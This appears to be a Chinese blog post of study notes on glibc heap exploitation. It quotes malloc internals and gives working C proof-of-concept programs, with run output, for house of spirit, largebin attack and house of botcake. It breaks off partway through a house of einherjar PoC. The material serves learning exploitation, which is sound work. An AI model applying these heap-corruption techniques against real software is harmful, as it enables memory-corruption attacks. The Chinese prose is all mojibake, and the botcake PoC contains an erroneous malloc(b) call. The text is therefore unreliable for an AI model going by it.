<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ£€æŸ¥çš„æ¡ä»¶æ˜¯:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.nextchunk.prev_size &gt; chunk_hdr_sz (0x10)</span><br><span class="line">2.nextchunk.prev_size &lt; av-&gt;system_mem (æ•´ä¸ªå †åŒºçš„å¤§å°,å¯èƒ½æ˜¯0x21000)</span><br></pre></td></tr></table></figure>
<p>ä¸éœ€è¦å’Œ<code>fake_chunk.size</code>è®¾ç½®ç›¸åŒ,åªéœ€è¦æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶å³å¯</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">10</span>];</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x40</span>;  <span class="comment">//size</span></span><br><span class="line">    fake_chunk[<span class="number">9</span>] = <span class="number">0x1145</span>;  <span class="comment">//ç»•è¿‡ä¸¤ä¸ªå®½æ¾çš„æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = (<span class="type">size_t</span> *)&amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">free</span>(victim);       <span class="comment">//å°†å †æ ˆä¸Šçš„å‡å †å—é‡Šæ”¾è¿›å…¥fastbin</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;   </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">//æ¸…ç©ºtcacheä¿è¯ä¸‹ä¸€æ¬¡ä»fastbinä¸­æ‹¿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x30</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim: %p\n&quot;</span>, victim); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    assert(target == victim);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_spirit.c -o house_of_spirit -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_spirit</span><br><span class="line">victim: 0x7ffe53fab090</span><br><span class="line">target: 0x7ffe53fab090</span><br></pre></td></tr></table></figure>
<h3 id="largebins">largebins</h3>
<h4 id="ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€">ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101205326333.png"
alt="image-20241101205326333" />
<figcaption aria-hidden="true">image-20241101205326333</figcaption>
</figure>
<p>1.é¦–å…ˆå°†<code>0x431</code> é‡Šæ”¾è¿›å…¥<code>largebin</code></p>
<p>2.å‡è®¾æ­¤æ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ª<code>UAF</code>
,ä¿®æ”¹<code>0x431</code>ä»å †å—çš„<code>bk_nextsize</code>æŒ‡é’ˆæŒ‡å‘ç›®æ ‡åœ°å€</p>
<p>3.å°†é‡Šæ”¾<code>0x421</code>é‡Šæ”¾è¿›å…¥<code>largebin</code>,æ­¤æ—¶ç”±äº<code>0x421</code>æ˜¯è¯¥<code>bin</code>ä¸­æœ€å°çš„,å› æ­¤<code>0x421</code>æ”¾å…¥<code>largebin</code>ä¸­ä¸ä¼šæœ‰ä»»ä½•æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>å…¶æ•ˆæœå°±æ˜¯<code>target-&gt;fd_nextsize = &amp;chunk_0x421</code></p>
<p><code>0x431</code>çš„<code>fd_nextsize</code>è¿˜æ˜¯é”™è¯¯åœ°æŒ‡å‘è‡ªå·±,è¿™æ˜¯å› ä¸ºä¿®æ”¹è¯¥æŒ‡é’ˆçš„<strong>æœºä¼š</strong>è¢«ç”¨äºä¿®æ”¹<code>target</code>çš„<code>fd_nextsize</code>äº†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//use struct to align automatically</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> fd;</span><br><span class="line">    <span class="type">size_t</span> bk;</span><br><span class="line">    <span class="type">size_t</span> fd_nextsize;</span><br><span class="line">    <span class="type">size_t</span> bk_nextsize;</span><br><span class="line">&#125;Target;</span><br><span class="line"></span><br><span class="line">Target target=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = <span class="number">0</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span>,</span><br><span class="line">    .fd_nextsize = <span class="number">0</span>,</span><br><span class="line">    .bk_nextsize = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size: %p\n&quot;</span>, target.prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %p\n&quot;</span>, target.size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %p\n&quot;</span>, target.fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk: %p\n&quot;</span>, target.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %p\n&quot;</span>, target.fd_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %p\n&quot;</span>, target.bk_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *gap1;</span><br><span class="line">    <span class="type">size_t</span> *gap2;</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    gap1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    gap2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);        <span class="comment">//A first put into unsortedbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//a larger malloc request cause A then put into largebin</span></span><br><span class="line">    <span class="built_in">free</span>(B);        <span class="comment">//B first put into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    A[<span class="number">3</span>] = &amp;target;</span><br><span class="line">    print_target();</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//put B into the same largebin as A</span></span><br><span class="line">    print_target();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc largebin_attack.c -o largebin_attack -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./largebin_attack</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: (nil)</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: 0x55ea6d16f6e0</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure>
<p>åŒç†å¯ä»¥å°†å †å—åœ°å€å†™åˆ°å †æ ˆä¸Š</p>
<h3 id="unsortedbin">unsortedbin</h3>
<h4 id="house_of_botcake">house_of_botcake</h4>
<p>å½“é‡Šæ”¾çš„å †å—æ²¡æœ‰è¢«<code>tcache</code>æ¥å—(é€šå¸¸å› ä¸º<code>tcache</code>æ»¡äº†),ä¹Ÿæ²¡æœ‰è¢«<code>fastbin</code>æ¥å—(é€šå¸¸æ¯”<code>fastbin</code>ç®¡è¾–èŒƒå›´å¤§),</p>
<p>æ­¤æ—¶å°è¯•å¯¹å †å—å°è¯•<strong>å‘å‰åˆå¹¶å‘ååˆå¹¶</strong></p>
<p>å¦‚æœå‘åä¸´è¿‘<code>topchunk</code>åˆ™ç›´æ¥è¿˜ç»™<code>topchunk</code></p>
<p>å¦‚æœå‘åä¸ä¸´è¿‘<code>topchunk</code>,åˆ™ä¼šæ”¾åˆ°<code>unsortedbin</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>å‡è®¾æœ‰ä¸¤ä¸ªå †å—<code>a</code>å’Œ<code>b</code>åœ¨ç‰©ç†ä¸Šç›¸é‚»,<code>a</code>åœ¨ä½å¤„,<code>b</code>åœ¨é«˜å¤„</p>
<p>å…ˆé‡Šæ”¾<code>b</code>è¿›å…¥<code>unsortedbin</code>,ç„¶åé‡Šæ”¾<code>a</code>,</p>
<p>æ­¤æ—¶<code>a</code>ä¼šå‘å‰åˆå¹¶åˆ°<code>b</code></p>
<p>æ­¤æ—¶è®©<code>tcachebin</code>è…¾ä¸ªç©º,<code>Double Free a</code>,è®©<code>a</code>è¿›å…¥<code>tcachebins</code></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦è®©<code>tcachebin</code>è…¾ç©ºå‘¢?ç›´æ¥<code>free</code>æ”¾åˆ°<code>bins</code>ä¸­ä¸è¡Œå—?</p>
<p>è¿˜çœŸä¸è¡Œ,å› ä¸ºç¬¬ä¸€æ¬¡<code>free(a)</code>è¿›å…¥<code>unsortedbin</code>æ—¶,ä¼šè®©<code>a-&gt;nextchunk-&gt;prev_in_use</code>ç½®é›¶,</p>
<p>ä¸‹ä¸€æ¬¡å¦‚æœ<code>free(a)</code>è¿˜æ˜¯è¿›å…¥<code>unsortedbin</code>ä¸­æ—¶,ä¼šæ£€æŸ¥åˆ°<code>a-&gt;nextchunk-&gt;prev_in_use=0</code>,æ£€æŸ¥å‡ºäº†äºŒæ¬¡é‡Šæ”¾</p>
<p>è€Œ<code>tcachebins</code>åªä¼šæœ‰ä¸€ä¸ª<code>key</code>å€¼åˆ¤é‡æ£€æŸ¥,æ˜¾ç„¶é‡Šæ”¾è¿›å…¥<code>bins</code>ä¸­çš„å †å—ä¸ä¼šè®¾ç½®<code>key</code>å€¼,èƒ½å¤Ÿé€šè¿‡è¿™ä¸ªæ£€æŸ¥</p>
</blockquote>
<p>é‚£ä¹ˆæ­¤æ—¶å°±å½¢æˆäº†å †å—é‡å </p>
<p><code>a</code>æˆä¸º<code>b</code>è…¹ä¸­çš„ä¸€éƒ¨åˆ†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//b&#x27;s address is higher than a&#x27;s</span></span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//prevent consolidation with topchunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//free b into unsortedbins</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//a will consolidate with b </span></span><br><span class="line">    tcache_chunks[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//make room for </span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">malloc</span>(b);</span><br><span class="line">    b[<span class="number">0</span>]=<span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_botcake.c -o house_of_botcake -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_botcake</span><br><span class="line">0x1122334455667788</span><br></pre></td></tr></table></figure>
<h4 id="house_of_einherjar">house_of_einherjar</h4>
<p>æ”»å‡»å‡è®¾:</p>
<p>0.èƒ½å¤Ÿæ§åˆ¶<code>tcache</code>çš„çŠ¶æ€</p>
<p>1.å †å—ç”³è¯·æ—¶,å¤ç”¨ä¸‹ä¸€å †å—çš„<code>prev_size</code>å­—æ®µ,èƒ½å¤Ÿæ„é€ å‡çš„<code>prev_size</code>å­—æ®µ</p>
<p>å¹¶ä¸”å­˜åœ¨<code>off-by-one</code>,èƒ½å¤Ÿå†ä¿®æ”¹<code>size</code>çš„æ ‡å¿—ä½ä¸­çš„<code>prev_in_use</code></p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241104213606983.png"
alt="image-20241104213606983" />
<figcaption aria-hidden="true">image-20241104213606983</figcaption>
</figure>
<p><code>b</code>æœ€ç»ˆè¢«é‡Šæ”¾è¿›å…¥<code>tcache</code>ä¹‹å,å¯ä»¥ä½¿ç”¨<code>fake_chunk</code>æ”¹å†™<code>tcache</code>çš„å…ƒæ•°æ®è¿›è¡ŒæŠ•æ¯’</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span 